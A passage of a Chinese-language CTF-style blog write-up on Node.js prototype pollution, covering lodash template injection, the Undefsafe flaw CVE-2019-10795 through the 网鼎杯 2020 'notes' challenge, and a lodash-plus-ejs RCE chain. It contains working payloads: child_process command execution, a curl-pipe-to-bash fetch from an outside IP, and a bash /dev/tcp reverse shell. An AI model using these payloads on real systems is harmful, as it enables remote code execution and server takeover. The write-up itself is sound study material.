<li><p><code>++templateCounter</code> 是一个计数器，用于生成唯一的模板计数器值。</p>
</li>
<li><p><code>&#39;lodash.templateSources[&#39; + (++templateCounter) + &#39;]&#39;</code> 生成一个形如 <code>&#39;lodash.templateSources[1]&#39;</code> 的字符串，其中数字部分递增以保证唯一性。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>options是一个对象，source.url取到了其options.sourceurl属性，这个属性原本是没有赋值的，默认取空字符串</p>
<p>我们可以通过原型链污染给所有的object对象都插入一个sourcurl属性，最后这个属性被拼接进new Function的第二个参数中也就是sourceurl+return+source</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var result = attempt(function() &#123;</span><br><span class="line">        return Function(importsKeys, sourceURL + &#x27;return &#x27; + source)</span><br><span class="line">          .apply(undefined, importsValues);</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure></div>

<p>从而造成任意命令执行</p>
<p>但是在function中没有require函数，所以我们不能直接使用require(‘child_process’)</p>
<p>所以我们这里使用global.process.mainModule.constructor._load代替</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">\u000areturn e =&gt; &#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()//&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="Undefsafe-模块原型链污染（CVE-2019-10795）"><a href="#Undefsafe-模块原型链污染（CVE-2019-10795）" class="headerlink" title="Undefsafe 模块原型链污染（CVE-2019-10795）"></a>Undefsafe 模块原型链污染（CVE-2019-10795）</h5><p><code>Undefsafe</code> 是一个 JavaScript 库，用于安全地访问嵌套对象的属性和方法，以避免在访问时出现 <code>TypeError: Cannot read property &#39;x&#39; of undefined</code> 错误。但是其在低版本（&lt;2.0.3）中存在原型链污染漏洞</p>
<p>可以利用这个漏洞修改或添加object.prototype属性</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">const undefsafe = require(&#x27;undefsafe&#x27;);</span><br><span class="line"></span><br><span class="line">const obj = &#123;</span><br><span class="line">  foo: &#123;</span><br><span class="line">    bar: &#123;</span><br><span class="line">      baz: &#x27;Hello, World!&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">const value1 = undefsafe(obj, &#x27;foo.bar.baz&#x27;);</span><br><span class="line">console.log(value1); // 输出: Hello, World!</span><br><span class="line"></span><br><span class="line">const value2 = undefsafe(obj, &#x27;foo.bar.qux&#x27;);</span><br><span class="line">console.log(value2); // 输出: undefined</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710104926974.png"
                      alt="image-20230710104926974"
                ></p>
<p>示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var object = &#123;</span><br><span class="line">    a: &#123;</span><br><span class="line">        b: &#123;</span><br><span class="line">            c: 1,</span><br><span class="line">            d: [1,2,3],</span><br><span class="line">            e: &#x27;skysec&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">console.log(object.a.b.e)</span><br><span class="line">// skysec</span><br></pre></td></tr></table></figure></div>



<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710104958529.png"
                      alt="image-20230710104958529"
                ></p>
<p>由这个两个例子我们可以看到当我们访问存在的属性室友回显</p>
<p>访问不存在的属性不在报错，而是返回undefined</p>
<p>并且在对对象赋值，如果目标属性存在</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var object = &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    b: &#123;</span><br><span class="line">      c: 1,</span><br><span class="line">      d: [1, 2, 3],</span><br><span class="line">      e: &#x27;skysec&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">console.log(object)</span><br><span class="line">a(object,&#x27;a.b.e&#x27;,&#x27;123&#x27;)</span><br><span class="line">console.log(object)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710105451705.png"
                      alt="image-20230710105451705"
                ></p>
<p>当属性存在可以帮我们修改相应属性的值</p>
<p>如果不存在则会帮我们在访问属性上层进行创建并赋值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var object = &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    b: &#123;</span><br><span class="line">      c: 1,</span><br><span class="line">      d: [1, 2, 3],</span><br><span class="line">      e: &#x27;skysec&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">console.log(object)</span><br><span class="line">//&#123; a: &#123; b: &#123; c: 1, d: [Array], e: &#x27;skysec&#x27; &#125; &#125; &#125;</span><br><span class="line">a(object,&#x27;a.f.e&#x27;,&#x27;123&#x27;)</span><br><span class="line">console.log(object)</span><br><span class="line">//&#123; a: &#123; b: &#123; c: 1, d: [Array], e: &#x27;skysec&#x27; &#125; ,e:&quot;123&quot;&#125; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>上面的是关于undefsafe的一些特性，下面我详细分析一下undefsafe版本低于2.0.3存在的原型链污染漏洞</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var object = &#123;</span><br><span class="line">    a: &#123;</span><br><span class="line">        b: &#123;</span><br><span class="line">            c: 1,</span><br><span class="line">            d: [1,2,3],</span><br><span class="line">            e: &#x27;skysec&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var payload = &quot;__proto__.toString&quot;;</span><br><span class="line">a(object,payload,&quot;evilstring&quot;);</span><br><span class="line">console.log(object.toString);</span><br><span class="line">// [Function: toString]</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710113112484.png"
                      alt="image-20230710113112484"
                ></p>
<p>tostring方法是本来就存在的那么我们就等于通过undefsafe去修改成我们想要执行的语句</p>
<p>这样的话，那么当undefsafe（）函数的23参数可控的话，我们就可以污染object对象中的值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var test = &#123;&#125;</span><br><span class="line">console.log(&#x27;this is &#x27; + test)  </span><br></pre></td></tr></table></figure></div>

<p>这里test被当作字符串触发了tostring方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710113803314.png"
                      alt="image-20230710113803314"
                ></p>
<p>返回[object Object]</p>
<p>那我们这里就可以使用undefsafe进行原型链污染</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var test = &#123;&#125;</span><br><span class="line">a(test,&#x27;__proto__.toString&#x27;,function()&#123; return &#x27;just a evil!&#x27;&#125;)</span><br><span class="line">console.log(&#x27;this is &#x27;+test)    // 将test对象与字符串&#x27;this is &#x27;进行拼接</span><br><span class="line">// this is just a evil!</span><br></pre></td></tr></table></figure></div>

<p>我们这里通过undefsafe修改tostring的值，污染原型链</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710113930174.png"
                      alt="image-20230710113930174"
                ></p>
<p>可以看到这里输出了evil，而不是object，这就是因为我们原型链污染导致的，这里把对象当作字符串输出，就会触发tosting方法，但是当前对象没有，就会沿着原型链向上查找同时进行调用，这里输出的tostring的值正是我们上面污染的值。</p>
<h6 id="例题-网鼎杯-2020-青龙组-notes"><a href="#例题-网鼎杯-2020-青龙组-notes" class="headerlink" title="例题 [网鼎杯 2020 青龙组]notes"></a>例题 [网鼎杯 2020 青龙组]notes</h6><p>题目源码app.js</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var path = require(&#x27;path&#x27;);</span><br><span class="line">const undefsafe = require(&#x27;undefsafe&#x27;);</span><br><span class="line">const &#123; exec &#125; = require(&#x27;child_process&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line">class Notes &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.owner = &quot;whoknows&quot;;</span><br><span class="line">        this.num = 0;</span><br><span class="line">        this.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        this.note_list[(this.num++).toString()] = &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        var r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(this.note_list, id));</span><br><span class="line">        return r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.author&#x27;, author);</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        return this.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        delete this.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var notes = new Notes();</span><br><span class="line">notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#x27;s first note&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, function(req, res, next) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;, &#123; title: &#x27;Notebook&#x27; &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/add_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &#x27;please use POST to add a note&#x27;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let raw = req.body.raw;</span><br><span class="line">        if (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;add note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;did not add note&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/edit_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let enote = req.body.raw;</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/delete_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to delete a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        if (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete done&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/notes&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let q = req.query.q;</span><br><span class="line">        let a_note;</span><br><span class="line">        if (typeof(q) === &quot;undefined&quot;) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(&#x27;note&#x27;, &#123;list: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/status&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands = &#123;</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(`stdout: $&#123;stdout&#125;`);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&#x27;OK&#x27;);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(function(req, res, next) &#123;</span><br><span class="line">  res.status(404).send(&#x27;Sorry cant find that!&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(function(err, req, res, next) &#123;</span><br><span class="line">  console.error(err.stack);</span><br><span class="line">  res.status(500).send(&#x27;Something broke!&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const port = 8080;</span><br><span class="line">app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:$&#123;port&#125;`))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710114805388.png"
                      alt="image-20230710114805388"
                ></p>
<p>可以看到这个查看和编辑note时会调用undefsafe方法</p>
<p>分析一下路由：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.route(&#x27;/status&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands = &#123;</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(`stdout: $&#123;stdout&#125;`);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&#x27;OK&#x27;);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></div>

<p>可以看到在status路由下面有一个exec命令执行函数那我们可以通过控制commands。去执行我们想要执行的命令</p>
<p>继续分析其他路由，找传参点</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.route(&#x27;/edit_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let enote = req.body.raw;</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></div>

<p>这里接受三个参数，id，author，raw&#x3D;&gt;enote</p>
<p>然后执行 notes.edit_note(id, author, enote);</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">       undefsafe(this.note_list, id + &#x27;.author&#x27;, author);</span><br><span class="line">       undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到这些调用了undefsafe，而且后两个参数都是可控的，那我们这里就可以通过undefsafe方法进行原型链污染</p>
<p>而且这里最终修改的是note_list中的值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br></pre></td></tr></table></figure></div>

<p>但是可以看到我们这里执行的commands</p>
<p>不过commands和note_list的原型是一样的都是Object.prototype</p>
<p>所以我们污染note_list其实就是污染了Object.prototype中的值</p>
<p>当commands在自身对象中找不到我们要执行的命令就会沿着原型链向上查找。而且这里是一个遍历，遍历会沿着原型链向上查找，那么在遍历 <code>commands</code> 时便会取到我们污染进去的恶意命令并执行。</p>
<p>payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=__proto__.a&amp;author=curl http://1.15.75.117/shell.txt|bash&amp;raw=a;</span><br></pre></td></tr></table></figure></div>

<p>shell.txt:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/174.1.62.169/9999 0&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这样我们在note_list的__proto__objetc中添加了一个a属性的值，内容为curl <a class="link"   href="http://1.15.75.117/shell.txt|bash,%E7%84%B6%E5%90%8E%E5%8F%8D%E5%BC%B9shell" >http://1.15.75.117/shell.txt|bash,然后反弹shell <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(`stdout: $&#123;stdout&#125;`);</span><br><span class="line">            &#125;);</span><br></pre></td></tr></table></figure></div>

<p>这里再遍历的时候会遍历到object中的命令从而进行命令执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710121647348.png"
                      alt="image-20230710121647348"
                ></p>
<h5 id="Lodash配合ejs模板引擎实现-RCE-CVE-2022-29078"><a href="#Lodash配合ejs模板引擎实现-RCE-CVE-2022-29078" class="headerlink" title="Lodash配合ejs模板引擎实现 RCE CVE-2022-29078"></a>Lodash配合ejs模板引擎实现 RCE CVE-2022-29078</h5><p>nodejs的ejs模板引擎存在一个利用原型链污染的进行rce的一个漏洞</p>
<p>但是我们想要实现rce就要先进行原型链污染，这里使用lodash,merge方法中的原型链污染漏洞</p>
<p>app.js</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var lodash = require(&#x27;lodash&#x27;);</span><br><span class="line">var ejs = require(&#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line">//设置模板的位置与种类</span><br><span class="line">app.set(&#x27;views&#x27;, __dirname);</span><br><span class="line">app.set(&#x27;views engine&#x27;,&#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">//对原型进行污染</span><br><span class="line">var malicious_payload = &#x27;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2&quot;&#125;&#125;&#x27;;</span><br><span class="line">lodash.merge(&#123;&#125;, JSON.parse(malicious_payload));</span><br><span class="line"></span><br><span class="line">//进行渲染</span><br><span class="line">app.get(&#x27;/&#x27;, function (req, res) &#123;</span><br><span class="line">    res.render (&quot;index.ejs&quot;,&#123;</span><br><span class="line">        message: &#x27;whoami test&#x27;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//设置http</span><br><span class="line">var server = app.listen(8000, function () &#123;</span><br><span class="line"></span><br><span class="line">    var host = server.address().address</span><br><span class="line">    var port = server.address().port</span><br><span class="line"></span><br><span class="line">    console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<ul>
<li>index.ejs</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;&lt;%= message%&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>这里运行程序后就会弹出计算器</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710124022036.png"
                      alt="image-20230710124022036"
                ></p>
<p>可以看到运行之后就会弹出计算器，说明我们的命令执行了</p>
<p>分析源码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lodash.merge(&#123;&#125;, JSON.parse(malicious_payload));</span><br></pre></td></tr></table></figure></div>

<p>这里就是我们命令执行的核心</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710124443395.png"
                      alt="image-20230710124443395"
                ></p>
<p>我们从res.render开始分析</p>
<p>跟进render方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710151600520.png"
                      alt="image-20230710151600520"
                ></p>
<p>可以看到在__proto__中污染了一个 <code>outputFunctionName</code>属性值为</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2</span><br></pre></td></tr></table></figure></div>

<p>那么这里就引发出一个问题:</p>
<p>我们为什么要在原型链中污染一个outputFunctionName属性</p>
<p>继续往下面分析：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lodash.merge(&#123;&#125;, JSON.parse(malicious_payload));</span><br></pre></td></tr></table></figure></div>

<p>那么这里就是实现了污染了一个outputFunctionName属性</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">res.render(&quot;index.ejs&quot;, &#123;</span><br><span class="line">        message: &#x27;sp4c1ous&#x27;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div>

<p>从这里继续分析：</p>
<p>跟进这个render方法：</p>
<ul>
<li><p>node_modules&#x2F;express&#x2F;lib&#x2F;response.js</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">res.render = function render(view, options, callback) &#123;</span><br><span class="line">  var app = this.req.app;</span><br><span class="line">  var done = callback;</span><br><span class="line">  var opts = options || &#123;&#125;;</span><br><span class="line">  var req = this.req;</span><br><span class="line">  var self = this;</span><br><span class="line"></span><br><span class="line">  // support callback function as second arg</span><br><span class="line">  if (typeof options === &#x27;function&#x27;) &#123;</span><br><span class="line">    done = options;</span><br><span class="line">    opts = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // merge res.locals</span><br><span class="line">  opts._locals = self.locals;</span><br><span class="line"></span><br><span class="line">  // default callback to respond</span><br><span class="line">  done = done || function (err, str) &#123;</span><br><span class="line">    if (err) return req.next(err);</span><br><span class="line">    self.send(str);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  // render</span><br><span class="line">  app.render(view, opts, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>​       1.<code>var app = this.req.app;</code> 用于获取当前请求的 Express 应用程序实例。<br>2. <code>var done = callback;</code> 将 <code>callback</code> 赋值给变量 <code>done</code>，用于处理渲染完成后的回调函数。<br>3. <code>var opts = options || &#123;&#125;;</code> 将 <code>options</code> 赋值给变量 <code>opts</code>，如果 <code>options</code> 未定义，则使用空对象。<br>4. <code>var req = this.req;</code> 获取当前请求的 <code>req</code> 对象。<br>5. <code>var self = this;</code> 将当前的 <code>res</code> 对象赋值给变量 <code>self</code>，用于在回调函数中引用。<br>6. 检查第二个参数 <code>options</code> 的类型。如果是函数类型，那么将其作为回调函数，<code>done</code> 将被重置为该函数，同时将 <code>opts</code> 重置为空对象。<br>7. <code>opts._locals = self.locals;</code> 合并当前 <code>res</code> 对象的 <code>locals</code> 属性到 <code>opts</code> 对象中。<br>8. 默认的回调函数 <code>done</code> 用于处理渲染完成后的操作。如果发生错误，将通过 <code>req.next(err)</code> 处理错误，否则将使用 <code>self.send(str)</code> 将渲染结果发送给客户端。<br>9. 最后，通过调用 <code>app.render(view, opts, done)</code> 来执行实际的渲染操作，使用应用程序实例的 <code>render</code> 方法来渲染视图模板。</p>
<p>这段代码为 Express 应用程序的响应对象 <code>res</code> 添加了 <code>render</code> 方法，以便在路由处理程序中方便地渲染视图模板并发送给客户端</p>
<p>跟进app.render方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.render = function render(name, options, callback) &#123;</span><br><span class="line">  var cache = this.cache;</span><br><span class="line">  var done = callback;</span><br><span class="line">  var engines = this.engines;</span><br><span class="line">  var opts = options;</span><br><span class="line">  var renderOptions = &#123;&#125;;</span><br><span class="line">  var view;</span><br><span class="line"></span><br><span class="line">  // support callback function as second arg</span><br><span class="line">  if (typeof options === &#x27;function&#x27;) &#123;</span><br><span class="line">    done = options;</span><br><span class="line">    opts = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // merge app.locals</span><br><span class="line">  merge(renderOptions, this.locals);</span><br><span class="line"></span><br><span class="line">  // merge options._locals</span><br><span class="line">  if (opts._locals) &#123;</span><br><span class="line">    merge(renderOptions, opts._locals);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // merge options</span><br><span class="line">  merge(renderOptions, opts);</span><br><span class="line"></span><br><span class="line">  // set .cache unless explicitly provided</span><br><span class="line">  if (renderOptions.cache == null) 